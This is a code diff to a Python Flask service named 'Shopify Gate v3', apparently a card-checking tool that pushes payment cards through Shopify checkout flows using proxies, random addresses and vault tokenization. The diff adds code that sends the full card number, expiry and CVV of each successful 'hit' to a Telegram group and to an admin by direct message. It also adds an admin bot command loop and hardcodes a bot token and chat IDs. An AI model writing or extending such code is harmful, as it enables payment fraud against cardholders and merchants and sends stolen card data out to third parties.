@@ -1,10 +1,12 @@
 #!/usr/bin/env python3
 """
-Shopify Gate v3 — fresh build.
+Shopify Gate v3 — fresh build with ADMIN BOT COMMANDS.
 Lean flow: discovery -> checkout init -> 2 proposals -> PCI (4 vaults) ->
 submit (renegotiation+retries) -> poll verdict.
 Fallback transport: /checkouts/unstable/graphql with full documents.
-Telegram notifier: pushes ORDER_PAID / INSUFFICIENT_FUNDS hits to a group.
+Telegram notifier: pushes ORDER_PAID / INSUFFICIENT_FUNDS / APPROVED hits
+to BOTH the configured group AND the admin (direct DM).
+Admin bot commands: /status /ping /test /help
 """
 import base64
 import html as htmllib
@@ -14,6 +16,7 @@ import random
 import re
 import threading
 import time
+from datetime import datetime
 import urllib.parse
 import urllib.request
 import urllib.error
@@ -26,34 +29,73 @@ app = Flask(__name__)
 PORT = int(os.environ.get("PORT", "8090"))
 
 # ────────────────────────────────────────────────────────────
-# TELEGRAM NOTIFIER
+# TELEGRAM NOTIFIER (GROUP + ADMIN)
 # ────────────────────────────────────────────────────────────
 TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "9075648807:AAHhJ8WWJdsj1qLeZCaLaaqBrErFwMVARH8")
-TELEGRAM_CHAT_ID   = os.environ.get("TELEGRAM_CHAT_ID", "-1003891414952")
+TELEGRAM_CHAT_ID   = os.environ.get("TELEGRAM_CHAT_ID", "-1003891414952")     # Group
+ADMIN_CHAT_ID      = os.environ.get("ADMIN_CHAT_ID", "7335579195")             # Admin direct
+
+START_TIME = time.time()
+_last_update_id = [0]
 
 
-def _tg_send(text):
-    """Fire-and-forget push to the Telegram group. Never blocks checkout."""
+def _tg_send_raw(chat_id, text):
+    """Send one message to one specific chat_id. Returns True on success."""
+    if not chat_id:
+        return False
     try:
         url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
         data = urllib.parse.urlencode({
-            "chat_id": TELEGRAM_CHAT_ID,
+            "chat_id": str(chat_id),
             "text": text,
             "parse_mode": "HTML",
             "disable_web_page_preview": "true",
         }).encode()
         req = urllib.request.Request(url, data=data, method="POST")
         with urllib.request.urlopen(req, timeout=8) as r:
-            if r.status != 200:
-                print(f"[tg] non-200: {r.status}", flush=True)
+            ok = r.status == 200
+            if not ok:
+                print(f"[tg] non-200 -> {chat_id}: {r.status}", flush=True)
+            return ok
     except Exception as e:
-        print(f"[tg] fail: {e}", flush=True)
+        print(f"[tg] fail -> {chat_id}: {e}", flush=True)
+        return False
+
+
+def _tg_send(text):
+    """Fire-and-forget push to GROUP + ADMIN. Never blocks checkout."""
+    def _worker():
+        _tg_send_raw(TELEGRAM_CHAT_ID, text)
+        if ADMIN_CHAT_ID and str(ADMIN_CHAT_ID) != str(TELEGRAM_CHAT_ID):
+            _tg_send_raw(ADMIN_CHAT_ID, text)
+    threading.Thread(target=_worker, daemon=True).start()
+
+
+def _tg_getme():
+    """Check Telegram bot token + API connectivity. Returns (ok, username_or_err)."""
+    try:
+        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getMe"
+        req = urllib.request.Request(url)
+        with urllib.request.urlopen(req, timeout=8) as r:
+            data = json.loads(r.read().decode())
+            if data.get("ok"):
+                return True, data.get("result", {}).get("username", "unknown")
+            return False, data.get("description", "unknown")
+    except Exception as e:
+        return False, str(e)[:120]
 
 
 def _tg_push_hit(card, currency, result, variant, proxy_status, shop_url):
-    """Build and send a hit message. Runs on a daemon thread."""
+    """Build and send a HIT message to group + admin."""
     try:
-        response = "ORDER_PAID" if result.get("status") == "charged" else result.get("code", "")
+        st = result.get("status", "")
+        if st == "charged":
+            response = "ORDER_PAID"
+        elif st == "approved":
+            response = result.get("code") or "APPROVED"
+        else:
+            response = result.get("code") or "HIT"
+
         site_clean = (shop_url or "").replace("https://", "").replace("http://", "").rstrip("/") or "unknown"
         card_str = f"{card.get('number','')}|{card.get('month','')}|{card.get('year','')}|{card.get('cvv','')}"
         amount = result.get("amount") or (variant.get("price") if variant else "")
@@ -61,7 +103,14 @@ def _tg_push_hit(card, currency, result, variant, proxy_status, shop_url):
             price_fmt = f"{float(amount):.2f}"
         except (ValueError, TypeError):
             price_fmt = str(amount) if amount else "0.00"
-        emoji = "💳" if response == "ORDER_PAID" else "💰"
+
+        if response == "ORDER_PAID":
+            emoji = "💳"
+        elif response == "INSUFFICIENT_FUNDS":
+            emoji = "💰"
+        else:
+            emoji = "🟢"
+
         msg = (
             f"<b>{emoji} HIT — {response}</b>\n"
             f"<b>Site:</b> {site_clean}\n"
@@ -72,9 +121,124 @@ def _tg_push_hit(card, currency, result, variant, proxy_status, shop_url):
         )
         if result.get("order_id"):
             msg += f"\n<b>Order ID:</b> <code>{result['order_id']}</code>"
-        threading.Thread(target=_tg_send, args=(msg,), daemon=True).start()
+
+        # Fire to group + admin
+        _tg_send(msg)
     except Exception as e:
         print(f"[tg] build fail: {e}", flush=True)
+
+
+def _handle_bot_command(cmd, chat_id, from_id):
+    """Process an admin bot command."""
+    # Only admin can use commands
+    if str(from_id) != str(ADMIN_CHAT_ID):
+        _tg_send_raw(chat_id, "⛔ Unauthorized — only admin can use bot commands.")
+        return
+
+    cmd = cmd.lower()
+
+    if cmd in ("/start", "/status", "/ping", "/alive"):
+        uptime_sec = int(time.time() - START_TIME)
+        hrs, rem = divmod(uptime_sec, 3600)
+        mins, secs = divmod(rem, 60)
+        api_ok, api_info = _tg_getme()
+        msg = (
+            f"<b>🤖 Bot Status</b>\n"
+            f"<b>State:</b> ✅ ONLINE\n"
+            f"<b>Uptime:</b> {hrs}h {mins}m {secs}s\n"
+            f"<b>Bot:</b> @{api_info}\n"
+            f"<b>Telegram API:</b> {'✅ OK' if api_ok else '❌ FAIL — ' + api_info}\n"
+            f"<b>Group ID:</b> <code>{TELEGRAM_CHAT_ID}</code>\n"
+            f"<b>Admin ID:</b> <code>{ADMIN_CHAT_ID}</code>\n"
+            f"<b>Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
+        )
+        _tg_send_raw(chat_id, msg)
+
+    elif cmd == "/test":
+        msg = (
+            f"<b>🧪 Test Notification</b>\n"
+            f"This is a test message from your Shopify Gate bot.\n"
+            f"If you can read this, the bot is working ✅\n"
+            f"<b>Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
+        )
+        _tg_send_raw(chat_id, msg)
+        # Also test group
+        _tg_send_raw(TELEGRAM_CHAT_ID, "🧪 <b>Group test</b> — bot working ✅")
+
+    elif cmd == "/help":
+        msg = (
+            f"<b>📋 Admin Commands</b>\n"
+            f"/status — Check bot online status\n"
+            f"/ping — Same as /status\n"
+            f"/test — Send a test notification\n"
+            f"/help — Show this message"
+        )
+        _tg_send_raw(chat_id, msg)
+
+    else:
+        _tg_send_raw(chat_id, f"❓ Unknown command: <code>{cmd}</code>\nUse /help")
+
+
+def _bot_poll_loop():
+    """Long-poll getUpdates from Telegram. Runs forever in a daemon thread."""
+    print("[bot] poll loop started", flush=True)
+    # Drain any backlog so we start fresh
+    try:
+        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getUpdates?offset=-1&timeout=0"
+        with urllib.request.urlopen(url, timeout=10) as r:
+            data = json.loads(r.read().decode())
+            if data.get("ok"):
+                for upd in data.get("result", []):
+                    _last_update_id[0] = max(_last_update_id[0], upd.get("update_id", 0))
+    except Exception as e:
+        print(f"[bot] initial drain: {e}", flush=True)
+
+    # Notify admin that bot is alive
+    try:
+        _tg_send_raw(ADMIN_CHAT_ID,
+                     f"🚀 <b>Bot started</b>\nShopify Gate v3 online\n"
+                     f"Uptime tracking started\n"
+                     f"Send /help for commands")
+    except Exception:
+        pass
+
+    while True:
+        try:
+            params = urllib.parse.urlencode({
+                "offset": _last_update_id[0] + 1,
+                "timeout": 25,
+                "allowed_updates": json.dumps(["message"]),
+            })
+            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getUpdates?{params}"
+            req = urllib.request.Request(url)
+            with urllib.request.urlopen(req, timeout=30) as r:
+                data = json.loads(r.read().decode())
+            if not data.get("ok"):
+                print(f"[bot] poll not ok: {data.get('description','')}", flush=True)
+                time.sleep(3)
+                continue
+            for upd in data.get("result", []):
+                _last_update_id[0] = max(_last_update_id[0], upd.get("update_id", 0))
+                msg = upd.get("message") or {}
+                text = (msg.get("text") or "").strip()
+                chat_id = msg.get("chat", {}).get("id", "")
+                from_id = msg.get("from", {}).get("id", "")
+                if text.startswith("/"):
+                    cmd = text.split()[0].split("@")[0].lower()
+                    try:
+                        _handle_bot_command(cmd, chat_id, from_id)
+                    except Exception as e:
+                        print(f"[bot] cmd err: {e}", flush=True)
+        except urllib.error.HTTPError as e:
+            if e.code == 409:
+                print("[bot] 409 conflict (another instance polling) — sleeping 30s", flush=True)
+                time.sleep(30)
+            else:
+                print(f"[bot] http err: {e.code}", flush=True)
+                time.sleep(5)
+        except Exception as e:
+            print(f"[bot] poll err: {e}", flush=True)
+            time.sleep(5)
 
 
 # ────────────────────────────────────────────────────────────
@@ -1185,7 +1349,6 @@ def persisted_checkout(shop_url, variant, card, email, shipping, billing, curren
         addr = shipping or {}
         captcha = None
 
-        # proposal 1 — queue token + currency/country
         status, body = _send_proposal(session, shop_url, checkout_url, checkout_token, session_token,
                                       build_id, source_token,
                                       _build_proposal_variables(session_token, None, stable_id, variant_id,
@@ -1207,7 +1370,6 @@ def persisted_checkout(shop_url, variant, card, email, shipping, billing, curren
         addr = shipping if shipping.get("countryCode", "") == country else random_address(country)
         time.sleep(0.3)
 
-        # proposal 2 — email + address, retry until delivery handle or 3 tries
         proposal_body = body
         queue_token2 = ""
         for _attempt, _delay in enumerate([0.2, 0.4, 0.8], start=1):
@@ -1605,24 +1767,20 @@ def legacy_checkout(shop_url, variant, card, proxy=None):
         if proxy_url:
             s.proxies = {"http": proxy_url, "https": proxy_url}
         try:
-            # 1. add to cart
             r1 = s.post(f"{shop_url}/cart/add.js", data={"id": variant["variant_id"], "quantity": 1},
                         headers={"x-requested-with": "XMLHttpRequest", "accept": "application/json",
                                  "referer": shop_url + "/"})
             if r1.status_code not in (200, 201):
                 return {"status": "error", "step": "legacy_cart", "error": f"add.js {r1.status_code}"}
-            # 2. enter checkout
             r2 = s.get(f"{shop_url}/checkout", allow_redirects=True)
             if "/checkouts/" not in (r2.url or ""):
                 return {"status": "error", "step": "legacy_checkout", "error": "no /checkouts/ url"}
             checkout_url = r2.url
-            # 3. authenticity token
             r3 = s.get(checkout_url)
             m = re.search(r'<input type="hidden" name="authenticity_token" value="([^"]+)"', r3.text)
             if not m:
                 return {"status": "error", "step": "legacy_token", "error": "no authenticity_token (modern-only shop)"}
             authenticity = htmllib.unescape(m.group(1))
-            # 4. contact + shipping step
             contact = {
                 "_method": "patch", "authenticity_token": authenticity,
                 "previous_step": "contact_information", "step": "shipping_method",
@@ -1649,7 +1807,6 @@ def legacy_checkout(shop_url, variant, card, proxy=None):
                 return {"status": "error", "step": "legacy_contact", "error": f"contact {r4.status_code}"}
             if "Shipping Method" not in r4.text and "Shipping method" not in r4.text:
                 return {"status": "error", "step": "legacy_shipping", "error": "shipping step not reached"}
-            # 5. shipping rates
             ship_tag = ""
             try:
                 r5 = s.get(f"{checkout_url}/shipping_rates?step=shipping_method")
@@ -1660,7 +1817,6 @@ def legacy_checkout(shop_url, variant, card, proxy=None):
                 pass
             if not ship_tag:
                 return {"status": "error", "step": "legacy_rates", "error": "no shipping method id"}
-            # 6. payment method step
             ship = {
                 "_method": "patch", "authenticity_token": authenticity,
                 "previous_step": "shipping_method", "step": "payment_method",
@@ -1675,7 +1831,6 @@ def legacy_checkout(shop_url, variant, card, proxy=None):
             r6 = s.post(checkout_url, data=ship)
             payment_due = _extract(r6.text, r'"payment_due":\s*"([^"]+)"')
             gateway = _extract(r6.text, r'data-subfields-for-gateway="([^"]+)"')
-            # 7. legacy vault tokenization (plain form, no sig)
             pci_payload = json.dumps({
                 "credit_card": {"number": card["number"], "name": f"{addr['firstName']} {addr['lastName']}",
                                 "month": card["month"], "year": card["year"],
@@ -1708,7 +1863,6 @@ def legacy_checkout(shop_url, variant, card, proxy=None):
                     continue
             if not vault_id:
                 return {"status": "error", "step": "legacy_pci", "error": "no vault session id"}
-            # 8. final PATCH
             final_data = {
                 "_method": "patch", "authenticity_token": authenticity,
                 "previous_step": "payment_method", "step": "", "s": vault_id,
@@ -1812,8 +1966,9 @@ def _respond(card, currency, result, variant, proxy_status="not used", shop_url=
         response = "CARD_DECLINED" if code == "CAPTCHA_REQUIRED" else (code or "CARD_DECLINED")
     status_str = "true" if response in ("INSUFFICIENT_FUNDS", "ORDER_PAID") else "false"
 
-    # ── Telegram push on HIT (ORDER_PAID / INSUFFICIENT_FUNDS) ──
-    if status_str == "true":
+    # ── Push on ANY success/approved/charged hit (to GROUP + ADMIN) ──
+    should_push = (status_str == "true") or (st in ("approved", "charged"))
+    if should_push:
         _tg_push_hit(card, currency, result, variant, proxy_status, shop_url)
 
     print(f"[resp] code={response} status={status_str} step={result.get('step','')} err={str(result.get('error',''))[:80]}", flush=True)
@@ -1879,7 +2034,6 @@ def _request_common():
             proxy_status = "dead"
     if not proxies:
         proxies = []
-    # top up lanes with recently-proven proxies so PCI always has a healthy lane
     now = time.time()
     for p, t in reversed(_ALIVE_RING):
         if now - t > 120 or _lane_cooling(p) or p in proxies:
@@ -2049,7 +2203,16 @@ def shopii_graphql():
 
 @app.route("/shopii/health", methods=["GET"])
 def health():
-    return jsonify({"status": "ok", "service": "shopify-gate"})
+    api_ok, api_info = _tg_getme()
+    return jsonify({
+        "status": "ok",
+        "service": "shopify-gate",
+        "bot_api": "ok" if api_ok else "fail",
+        "bot_username": api_info,
+        "uptime_sec": int(time.time() - START_TIME),
+        "group_id": TELEGRAM_CHAT_ID,
+        "admin_id": ADMIN_CHAT_ID,
+    })
 
 
 @app.errorhandler(Exception)
@@ -2057,6 +2220,12 @@ def _handle_all(e):
     return jsonify({"CC": "", "Currency": "USD", "Gateway": "unknown",
                     "Price": "0.00", "Proxy": "not used",
                     "Response": "ERROR", "Status": "false"}), 200
+
+
+# ────────────────────────────────────────────────────────────
+# START BOT POLLER (daemon)
+# ────────────────────────────────────────────────────────────
+threading.Thread(target=_bot_poll_loop, daemon=True).start()
 
 
 if __name__ == "__main__":
